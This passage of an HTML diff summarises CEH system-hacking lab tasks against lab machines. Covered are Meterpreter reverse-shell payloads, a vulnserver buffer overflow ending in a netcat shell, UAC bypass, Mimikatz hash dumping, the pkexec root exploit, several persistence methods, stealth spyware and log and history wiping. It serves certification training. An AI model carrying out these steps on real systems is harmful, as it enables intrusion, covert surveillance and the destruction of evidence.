+                    <p>Restart Windows 11, sign in Admin (Pa$$w0rd). On Parrot open Terminal, sudo su (toor), cd, service postgresql start. Launch Armitage via Applications → Pentesting → Exploitation Tools → Metasploit Framework → armitage; security pop-up password toor; Connect default; Start Metasploit? Yes. Hosts → Nmap Scan → Intense Scan → input 10.10.1.11 → OK; after scan OK. Target host appears with Windows logo. Left pane expand payload → windows → meterpreter; double-click meterpreter_reverse_tcp; set LPORT 444; Output exe; Launch; Save as malicious_payload.exe on Desktop; OK. Reuse/create share dir, copy payload, start Apache. In Armitage double-click meterpreter_reverse_tcp again; LPORT 444; Output multi/handler; Launch. On Windows 11 browse http://10.10.1.13/share, download malicious_payload.exe, run, click Run. Session opens; host icon shows WINDOWS11. Right-click host → Meterpreter 1 → Interact → Meterpreter Shell; sysinfo. Explore → Browse Files (view Downloads, upload/mkdir/list drives); Screenshot. Other options: Desktop (VNC), Show Processes, Log Keystrokes, Webcam Shot. Escalate privileges, steal tokens, dump hashes. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> Target host icon, Meterpreter shell, file browser, screenshots.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 6 (Part 1): Ninja Jonin - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 navigate to E:\CEH-Tools\...\Ninja Jonin, copy Jonin-v1.1.0-win.zip and Ninja-v1.2.1-win.zip to C:\Users\Admin\Desktop. Extract Jonin here. Create Trial-Version folder. Extract Ninja into Trial-Version. Edit Trial-Version\config\constants.json with Notepad (More apps → Notepad): Name Server22, Host 10.10.1.11; save. Archive Trial-Version folder as ZIP (WinRAR Add to archive, ZIP format). Run Jonin-v1.1.0-win.exe on Desktop, press any key to start listener. Copy Trial-Version.zip to E:\CEH-Tools\...\Spyware. Switch to Windows Server 2022, sign in CEH\Administrator (Pa$$w0rd). Copy Trial-Version.zip from Z: to Desktop, extract here. Run Ninja-v1.2.1-win.exe, press any key to connect. On Windows 11 maximize Jonin listener. list shows Server22 with index 1. connect 1. change → Enter Type cmd. ipconfig shows victim IP. whoami shows logged user. #help lists commands. Functions include upload/download. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> Connected device list, cmd session, ipconfig/whoami output.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 7 (Part 1): Buffer Overflow - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 run vulnserver.exe as admin (allow firewall); minimize. Install Immunity Debugger as admin (install Python). Open Immunity as admin, File → Attach → vulnserver → Attach; status Paused; click Run (Running). Switch to Parrot. nc -nv 10.10.1.11 9999; Welcome message; HELP lists commands; EXIT. Create stats.spk with SPIKE template; generic_send_tcp; STATS not vulnerable (Immunity still Running). Ctrl+C. Create trun.spk; generic_send_tcp; TRUN pauses Immunity (buffer overflow), EAX/ESP/EBP/EIP overwritten with "A". Ctrl+Z. Close Immunity/vulnserver; relaunch both as admin and attach/run. Copy Scripts folder from Windows share to Parrot Desktop via SMB (smb://10.10.1.11, Admin/Pa$$w0rd, CEH-Tools → Buffer Overflow Tools → Scripts). cd Scripts; chmod +x fuzz.py; ./fuzz.py; vulnserver receives growing buff; Immunity eventually Paused; EIP not overwritten; Ctrl+C; message ~11800 bytes crashed server. Close/relaunch. Generate pattern length 11900, copy. pluma findoff.py, replace offset string with pattern, save. chmod +x findoff.py; ./findoff.py sends pattern; Immunity EIP overwritten with random bytes (note value). Open new terminal root; pattern_offset.rb -l 11900 -q 386F4337 → offset 2003. Close terminal. Close/relaunch Immunity/vulnserver. chmod +x overwrite.py; ./overwrite.py to test EIP control (EIP overwritten). Close/relaunch. badchars.py sends bad chars; in Immunity follow ESP in dump; no bad chars found. Close/relaunch. Copy mona.py to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands. In Immunity !mona modules → essfunc.dll has no protections. nasm_shell.rb: JMP ESP → FFE4. !mona find -s "\xff\xe4" -m essfunc.dll → return address 0x625011af. Close/relaunch; Go to address 625011af; F2 breakpoint; Run. chmod +x jump.py; ./jump.py; Immunity EIP overwritten with return address. Close/relaunch vulnserver only. Generate shellcode with msfvenom (LHOST 10.10.1.13 LPORT 4444, bad char \x00), copy. pluma shellcode.py, paste shellcode into overflow line, save. New terminal root: nc -nvlp 4444. chmod +x shellcode.py; ./shellcode.py. Netcat receives shell; whoami. Concludes. Close all; document. Restart Parrot and Windows 11.</p>
+                    <p><strong>Expected output:</strong> Immunity Paused on TRUN; offset 2003; EIP controlled; netcat shell; whoami.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 1 (Part 2): PrivEsc Tools - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate Exploit.exe with shikata_ga_nai encoder, null-byte bad char. Verify share dir, copy payload, start Apache. msfconsole handler multi/handler, set payload/LHOST, exploit -j -z (background). Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download/run Exploit.exe (Run on security warning). Leave running, switch to Parrot; session opens. sessions -i 1; getuid shows WINDOWS11\Admin. Copy BeRoot folder from Windows share (CEH-Tools → Privilege Escalation Tools) to Parrot Desktop via SMB if needed; upload beRoot.exe to target pwd; shell; beRoot.exe shows services, permissions, keys, writable dirs, startup keys, tasks, WebClient vulns, privileges. exit. Copy Seatbelt.exe from Windows share (Github Tools); upload; shell; run Seatbelt groups system/user/misc (AMSI, AV, AppLocker, Chromium, creds, dir, DPAPI, etc.). exit. smart_hashdump fails "Insufficient privileges". getsystem -t 1 fails. background. bypassuac_fodhelper (FodHelper registry key). set SESSION 1, payload, LHOST, TARGET 0. exploit bypasses UAC; new session. getuid still normal; getsystem -t 1 now "got system"; getuid shows NT AUTHORITY\SYSTEM. smart_hashdump extracts NTLM hashes. clearev clears event logs. Concludes. Close windows and document. Restart Parrot.</p>
+                    <p><strong>Expected output:</strong> BeRoot/Seatbelt reports; "got system"; hashdump output; clearev success.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 2 (Part 2): Metasploit Post-Exploitation - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 create Secret.txt in C:\Users\Admin\Downloads with text "My credit card account number is 123456789." Parrot Terminal sudo su (toor), cd. Generate Backdoor.exe. Copy to share, start Apache. msfconsole handler, set payload/LHOST, show options (port), exploit -j -z. Windows 11 browse http://10.10.1.13/share, download Backdoor.exe (ensure same dir as Secret.txt), run, click Run. Leave running, switch to Parrot; session opens. sessions -i 1. sysinfo shows computer/OS/domain. ipconfig shows IP/MAC. getuid shows administrator. pwd shows current working dir (Downloads). ls lists files. cat Secret.txt reads content. timestomp Secret.txt -v shows created/accessed/modified/entry modified; timestomp -m changes Modified; verify. cd C:/ changes remote dir; pwd confirms. search -f pagefile.sys locates file. keyscan_start captures keystrokes; switch to Windows 11 and type in a text file; switch back; keyscan_dump dumps captured keys. idletime shows idle duration. shell opens cmd; dir /a:h lists hidden; sc queryex lists all services; netsh firewall show state/config; wmic product lists installed software; wmic cpu; wmic useraccount get name,sid; wmic os where Primary='TRUE' reboot reboots target (session dies). Concludes. Close windows and document. Restart Parrot.</p>
+                    <p><strong>Expected output:</strong> System info, IP/MAC, admin uid, file contents, timestamps, keystrokes, service/firewall/software lists, reboot.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 3 (Part 2): pkexec - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Parrot open Terminal. whoami shows non-root. mkdir /tmp/pwnkit. mv CVE-2021-4034 /tmp/pwnkit/. cd /tmp; cd pwnkit; cd CVE-2021-4034/. make compiles. ./cve-2021-4034 opens shell. whoami shows root. Concludes. Vulnerability patched in newer Unix OSes; demo of searching latest vulns via Exploit-DB and exploiting. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> whoami changes from normal user to root.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 4 (Part 2): UAC + Sticky Keys - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate Windows.exe payload (lhost 10.10.1.13 lport 444). Copy to share, start Apache. msfconsole handler multi/handler, set payload/lhost/lport, run. Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download Windows.exe, run, click Run. Leave running, switch to Parrot; session opens. sysinfo; getuid (WINDOWS11\Admin). background. search bypassuac; use bypassuac_fodhelper; set session 1; show options; set LHOST 10.10.1.13; set TARGET 0; exploit bypasses UAC. getsystem -t 1; getuid now NT AUTHORITY\SYSTEM. background. use sticky_keys; sessions; set session 2 (privileged); exploit. On Windows 11 sign out Admin, sign in Martin (apple), lock screen, press Shift 5 times → cmd opens with SYSTEM privileges instead of Sticky Keys error. whoami confirms. Concludes demonstration of persistence via Sticky Keys. Sign out Martin, sign in Admin (Pa$$w0rd). Restart Parrot.</p>
+                    <p><strong>Expected output:</strong> SYSTEM cmd on lock screen; whoami shows NT AUTHORITY\SYSTEM.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 5 (Part 2): Mimikatz - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate backdoor.exe. Copy to share, start Apache. msfconsole handler. Windows 11 browse http://10.10.1.13/share, download backdoor.exe, run, click Run. Leave running, switch to Parrot; session opens. sysinfo; getuid. background; bypassuac_fodhelper; set session 1; show options; set LHOST/TARGET; exploit; getsystem -t 1; getuid SYSTEM. load kiwi; help kiwi. lsa_dump_sam dumps NTLM hashes of all users. lsa_dump_secrets dumps LSA secrets (passwords, IE, service, SQL). password_change -u Admin -n &lt;NTLM hash&gt; -P password changes Admin password to "password". lsa_dump_sam again shows new hash. On Windows 11 lock machine; try old password Pa$$w0rd → incorrect; login with new password "password" succeeds. Concludes. Close windows and document. End lab and re-launch to reset machines.</p>
+                    <p><strong>Expected output:</strong> NTLM hashes, LSA secrets, successful password change, login with new password.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Tasks 1-2 (Part 3): Power Spy / SpyAgent - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Power Spy: On Windows Server 2022 sign in CEH\Administrator (Pa$$w0rd), handle network wizard. Open Remote Desktop Connection, Computer 10.10.1.19, Show Options, User name Jason, Connect, password qwerty, Yes. Minimize RDP (close Server Manager if appears). Copy setup.exe from Z:\CEHv12 Module 06 System Hacking\Spyware\General Spyware\Power Spy to target Desktop via RDP. Run setup.exe (Yes on UAC), install default, Finish, Run as Administrator. Setup login password window: New/Confirm password test@123, Submit, OK. Enter login password test@123, Submit. Register product: Later. Power Spy Control Panel: Start monitoring (OK on reboot recommended), Stealth Mode (read hotkey Ctrl+Alt+X), Confirm Yes. Delete setup.exe. Close RDP. Switch to Windows Server 2019, sign in Jason (qwerty), open IE and browse Gmail, sign out. Switch back to Windows Server 2022, RDP again (steps 3-7), close Server Manager. Ctrl+Alt+X to unhide, Run, Yes on UAC, login test@123, Later. Power Spy Control Panel: Stop monitoring. Applications executed (view), Screenshots, Websites Visited, Windows Opened, Clipboard, Event History. Uninstall via Uninstall button (Yes on notices). Close target windows and RDP.</p>
+                    <p>SpyAgent: On Windows Server 2022 open Remote Desktop Connection, Computer 10.10.1.19, Show Options, User name Jason, Connect, password qwerty, Yes. Close/minimize Server Manager. Copy Spytech SpyAgent folder from Z:\...\Spyware\General Spyware to target Desktop via RDP. Run Setup (password=spytech), Yes on UAC, install default. Select Administrator/Tester, Next. Ready To Install → Next. Include uninstaller? Yes. Close folder location window. Antivirus notice → Next. Finished: Run SpyAgent selected → Close. SpyAgent dialog → Continue. Welcome Step 1 → continue; set password test@123 (New/Confirm), OK, password changed OK. Step 2 → continue. Easy Configuration: Complete + Stealth Configuration; Load on Windows Startup; Next/Next; Apply → Next; Finish → Finish. (Skip SpyAnywhere Cloud Setup.) Step 3 → continue; Getting Started? No. Start Monitoring (bottom-left). Enter access password test@123, OK. Stealth Notice (hotkey Ctrl+Shift+Alt+M), OK. SpyAgent pop-up: check both "do not show" boxes, continue. Remove Spytech SpyAgent folder from Desktop. Close RDP. Switch to Windows Server 2019, sign in Jason (qwerty), open IE, browse Gmail, sign out. Switch to Windows Server 2022, RDP again (steps 1-5), close Server Manager (handle trial pop-up). Ctrl+Shift+Alt+M to unhide; enter password test@123. SpyAgent window: KEYBOARD & MOUSE → View Keystrokes Log (view keystrokes). Screenshots option. Website Usage → View Websites Logged (start/end/active time). Events Timeline. Also Windows Viewed, Program Usage, Files & Documents, Computer Usage. Close windows and RDP. Concludes. Close windows and document. End lab and re-launch to reset.</p>
+                    <p><strong>Expected output:</strong> Captured applications, screenshots, websites, keystrokes, events.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 3 (Part 3): NTFS Streams - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows Server 2019 sign in Administrator (Pa$$w0rd). Verify C: is NTFS: This PC → right-click Local Disk (C:) → Properties → File system NTFS → OK. Create C:\magic folder. Copy calc.exe from C:\Windows\System32 to C:\magic. Open cmd, cd C:\magic. notepad readme.txt → Yes to create → type HELLO WORLD!! → File Save → close. dir (note readme.txt size). type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe (hides calc.exe in ADS). dir (readme.txt size unchanged). Delete calc.exe from C:\magic. mklink backdoor.exe readme.txt:calc.exe. backdoor.exe launches calculator. Concludes (real-time attackers hide malicious files and execute remotely). Close windows and document.</p>
+                    <p><strong>Expected output:</strong> readme.txt size unchanged; backdoor.exe launches calculator.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 4 (Part 3): White Space Steganography - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows 11 sign in Admin (Pa$$w0rd). Copy Snow folder from E:\CEH-Tools\...\Whitespace Steganography Tools to Desktop. Create Notepad file, type Hello World!, press Enter, long-press hyphen to draw dashed line; save as readme.txt in Snow folder. Open cmd (search cmd → Open), cd C:\Users\Admin\Desktop\Snow. snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt (magic password; readme2.txt auto-created). Data hidden in readme2.txt. snow -C -p "magic" readme2.txt extracts and shows hidden data (password magic). Open readme2.txt in Notepad, Edit → Select All to see spaces/tabs. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> readme2.txt contains hidden message; extraction prints message.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 5 (Part 3): Image Steganography - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>On Windows Server 2019 search openstego → OpenStego. Click ellipsis next to Message File → navigate Z:\...\Image Steganography Tools\OpenStego → select New Text Document.txt (assume contains sensitive info) → Open. Click ellipsis next to Cover File → select Island.jpg → Open. Click ellipsis next to Output Stego File → choose Desktop, name Stego, Open. Click Hide Data → Success OK. Stego.bmp appears on Desktop; double-click to view (image only, no visible text). Close Photos. In OpenStego click Extract Data (left pane). Click ellipsis next to Input Stego File → Desktop → Stego.bmp → Open. Click ellipsis next to Output Folder → Desktop → Open. Click Extract Data → Success OK. Extracted New Text Document.txt on Desktop; double-click shows original text. Close OpenStego. StegOnline: open Firefox → https://stegonline.georgeom.net/upload → UPLOAD IMAGE → select Island.jpg → Open. Image Options → Embed Files/Data. Check checkboxes row 5 columns R,G,B. Input Data field: Text selected, type Hello World!!!, Go. Scroll to Output, Download Extracted Data (Save File if pop-up), save to Desktop. New tab → same URL → UPLOAD IMAGE → select Island.png from Desktop → Open. Image Options → Extract Files/Data. Check row 5 R,G,B → Go. Scroll to Results (download extracted data optional). Concludes. Other tools: QuickStego, SSuite Picsel, CryptaPix, gifshuffle. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> Stego.bmp image; extracted text file; StegOnline results show hidden text.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 6 (Part 3): Persistence via Startup - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate exploit.exe payload (lhost 10.10.1.13 lport 444). Copy to share, start Apache. msfconsole handler. Windows 11 sign in Admin (Pa$$w0rd), browse http://10.10.1.13/share, download exploit.exe, run, click Run. Leave running, switch to Parrot; session opens. getuid. background; bypassuac_fodhelper; set session 1; set LHOST/TARGET; exploit; getsystem -t 1; getuid SYSTEM. cd "C:\ProgramData\Start Menu\Programs\Startup"; pwd. Open new terminal root: msfvenom ... lport 8080 ... > payload.exe. In Meterpreter upload /home/attacker/payload.exe. Windows 11 sign in Admin; restart machine. Parrot open new terminal root: msfconsole handler multi/handler, set payload, lhost, lport 8080, exploit. Windows 11 sign in Admin and restart so payload in startup executes. Switch to Parrot; session opens (takes time). getuid shows admin privileges. Persistence maintained until payload detected. Concludes. Close windows and document. End lab and re-launch to reset.</p>
+                    <p><strong>Expected output:</strong> Meterpreter session after reboot on port 8080; getuid admin.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 7 (Part 3): Domain Persistence - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate Exploit.exe. Copy to share, start Apache. msfconsole handler. Windows Server 2022 sign in CEH\Administrator (Pa$$w0rd), browse http://10.10.1.13/share, download Exploit.exe, run, click Run. Switch to Parrot; session opens. getuid shows admin. upload -r PowerTools-master to C:\Users\Administrator\Downloads. shell; cd C:\Windows\System32; powershell. cd PowerView; Import-Module ./powerview.psm1. Add-ObjectAcl adds Martin to AdminSDHolder ACL with All rights. Get-ObjectAcl verifies Martin has GenericAll. REG ADD sets AdminSDProtectFrequency to 300 (3 min) instead of 60 min (Microsoft doesn't recommend; performance issues). On Windows Server 2022 open Server Manager → Tools → Active Directory Users and Computers → View → Advanced Features. Expand CEH.com and System → right-click AdminSDHolder → Properties → Security tab → Martin with full access (after ~3 min). Parrot Meterpreter: net group "Domain Admins" Martin /add /domain. Windows Server 2022 AD Users and Computers → Users → Martin J properties → Member Of shows Domain Admins. Sign out Administrator, sign in Other user CEH\Martin / apple. Open PowerShell, dir \\10.10.1.22\C$ → accessible, domain persistence established. PowerView additional commands table for extracting users/groups/domains. Concludes. Close windows and document. Restart Server 2022 and Parrot.</p>
+                    <p><strong>Expected output:</strong> Martin in Domain Admins; dir \\10.10.1.22\C$ succeeds.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 8 (Part 3): WMI Persistence - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot Terminal sudo su (toor), cd. Generate Payload.exe and wmi.exe. Copy both to share, start Apache. msfconsole handler. Windows Server 2019 sign in Administrator (Pa$$w0rd), browse http://10.10.1.13/share, download Payload.exe and wmi.exe (Save File), saved in Downloads. Run Payload.exe, click Run. Switch to Parrot; session opens. getuid. upload Wmi-Persistence-master to C:\Users\Administrator\Downloads. load powershell; powershell_shell. Import-Module ./WMI-Persistence.ps1 (or full path). Install-Persistence -Trigger Startup -Payload "C:\Users\Administrator\Downloads\wmi.exe" (takes ~5 min). Ctrl+C then y to exit PS. Open new terminal root: msfconsole handler multi/handler, set payload/lhost/lport, exploit. Windows Server 2019 restart (handle Other Unplanned pop-up). Previous session closes. After ~5 min new session opens in second terminal. getuid shows SYSTEM; persistence on restart. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> New Meterpreter session after reboot; getuid SYSTEM.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Task 9 (Part 3): Covert_TCP - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Parrot: open Terminal, cd Desktop, mkdir Send, cd Send, echo "Secret Message" > message.txt. Copy covert_tcp.c from CEH-Tools (CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert_TCP) via Places → ceh-tools 10.10.1.11 (or SMB smb://10.10.1.11, Admin/Pa$$w0rd) to Send folder. cc -o covert_tcp covert_tcp.c compiles. Switch to Ubuntu, sign in Ubuntu/toor. Open Terminal, sudo su (toor). tcpdump -nvvx port 8888 -i lo (listener). New tab: cd Desktop; mkdir Receive; cd Receive. Copy covert_tcp.c from Windows share via Files → Other Locations → smb://10.10.1.11 (Admin/Pa$$w0rd) → CEH-Tools → Covert_TCP to Receive. cc -o covert_tcp covert_tcp.c. sudo su. ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt starts receiver. Parrot: sudo su (toor), ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file .../message.txt sends one char at a time. Ubuntu terminal shows message received. Stop tcpdump (Ctrl+C); no packets captured. Open Wireshark on Parrot, capture eth0, filter tcp; inspect packets showing chars in headers. Open receive.txt in Ubuntu → full message. Concludes. Close windows and document.</p>
+                    <p><strong>Expected output:</strong> receive.txt contains "Secret Message"; tcpdump shows no captured packets; Wireshark shows TCP packets.</p>
+                </div>
+            </section>
+
+            <section class="lab-task">
+                <h3>Tasks 1-5 (Part 4): Clear Logs - Detailed Narrative</h3>
+                <div class="section-card">
+                    <p>Auditpol: On Windows 11 search cmd → Run as administrator, Yes on UAC. auditpol /get /category:* views all audit policies. auditpol /set /category:"system","account logon" /success:enable /failure:enable enables. auditpol /get /category:* verifies enabled. auditpol /clear /y clears. auditpol /get /category:* verifies "No Auditing" (system not logging). Concludes.</p>
+                    <p>Windows logs: On Windows 11 navigate to E:\CEH-Tools\...\Clear_Event_Viewer_Logs.bat, right-click → Run as administrator, Yes on UAC. Command prompt clears security/system/application logs and auto-closes. Search cmd → Run as administrator, Yes. wevtutil el lists event log names. wevtutil cl system clears system log (cl/clear-log; log_name system/application/security). cipher /w:C: overwrites deleted files on C: drive (first 0x00, then 0xFF, then random); press Ctrl+C to stop (time depends on size). Concludes (Clear_Event_Viewer_Logs.bat can also run via cmd/PowerShell). Close windows and document.</p>
+                    <p>Linux logs: On Parrot open Terminal. export HISTSIZE=0 disables saving history (HISTSIZE number of commands saved → 0). history -c clears stored history. history -w deletes current shell history only. shred ~/.bash_history makes content unreadable. more ~/.bash_history views shredded content. Ctrl+Z stops viewing. Combined: shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit (shreds, empties, clears, exits). Concludes. Close windows and document.</p>
+                    <p>Hiding artifacts: On Windows 11 search cmd → Run as administrator, Yes on UAC. cd C:\Users\Admin\Desktop. mkdir Test. dir (count dirs). attrib +h +s +r Test hides (hidden+system+readonly). dir confirms Test hidden (fewer dirs). attrib -s -h -r Test unhides. dir confirms restored. net user Test /add creates user. net user Test /active:yes activates. Windows icon → user Admin shows users list includes Test. net user Test /active:no hides account (removed from list). Switch to Parrot. Open Terminal, cd Desktop, mkdir Test, cd Test. >> Sample.txt and touch Sample.txt create file. touch .Secret.txt creates hidden file (dot prefix). ls shows only Sample.txt. ls -al shows .Secret.txt. Concludes. Close windows and document.</p>
+                    <p>CCleaner: On Windows 11 navigate to E:\CEH-Tools\...\Covering Tracks Tools\CCleaner; double-click ccsetup591_pro_trial.exe, Yes on UAC. Setup loads; CCleaner Professional Setup wizard → Install. Completed wizard: deselect View release notes, click Run CCleaner. Welcome to Free trial wizard → Start My Trial. CCleaner Professional window appears. Health Check (left pane) → Start → scan → Make it better → "Patching up your PC…" → "Your PC now feels like a superstar." Custom Clean can analyze system files (Windows/Applications tabs select/deselect). Registry scans issues. Tools: uninstall apps, software updates, browser plugins. Concludes. Close windows and document. End lab.</p>
+                    <p><strong>Expected output:</strong> Audit policies cleared; event logs cleared; history shredded; artifacts hidden; CCleaner cleanup completed.</p>
+                </div>
+            </section>
+
+        </div>
+    </main>
+    <script>
+        const body = document.body;
+    const applyTheme = (t) => {
+        if (t === 'dark') body.setAttribute('data-theme', 'dark');
+        else body.removeAttribute('data-theme');
+    };
+    function getTheme() {
+        try {
+            const p = new URLSearchParams(location.search);
+            const u = p.get('theme');
+            if (u === 'dark' || u === 'light') return u;
+        } catch (e) {}
+        try { return localStorage.getItem('theme') || 'light'; } catch (e) { return 'light'; }
+    }
+    function syncNavLinks(t) {
+        document.querySelectorAll('a[href]').forEach(a => {
+            try {
+                const url = new URL(a.getAttribute('href'), location.href);
+                if (url.pathname.endsWith('.html')) {
+                    url.searchParams.set('theme', t);
+                    a.setAttribute('href', url.pathname.split('/').pop() + '?' + url.searchParams.toString());
+                }
+            } catch (e) {}
+        });
+    }
+    const initialTheme = getTheme();
+    applyTheme(initialTheme);
+    syncNavLinks(initialTheme);
+    const toggle = document.getElementById('themeToggle');
+    if (toggle) {
+        toggle.addEventListener('click', () => {
+            const newT = body.hasAttribute('data-theme') ? 'light' : 'dark';
+            applyTheme(newT);
+            try { localStorage.setItem('theme', newT); } catch (e) {}
+            try {
+                const url = new URL(location.href);
+                url.searchParams.set('theme', newT);
+                history.replaceState(null, '', url.toString());
+            } catch (e) {}
+            syncNavLinks(newT);
+        });
+    }
+    const path = window.location.pathname.split('/').pop();
+        const navMap = {
+            'index.html': 'nav-index',
+            'module_02.html': 'nav-02',
+            'module_03.html': 'nav-03',
+            'module_04.html': 'nav-04',
+            'module_05.html': 'nav-05',
+            'module_06.html': 'nav-06',
+        'module_07.html': 'nav-07',
+        'module_08.html': 'nav-08',
+        'module_09.html': 'nav-09',
+        'cheat_sheet.html': 'nav-cheat'
+        };
+        const navId = navMap[path] || 'nav-index';
+        document.getElementById(navId).classList.add('active');
+    </script>
+    <script src="app.js"></script>
+</body>
+</html>
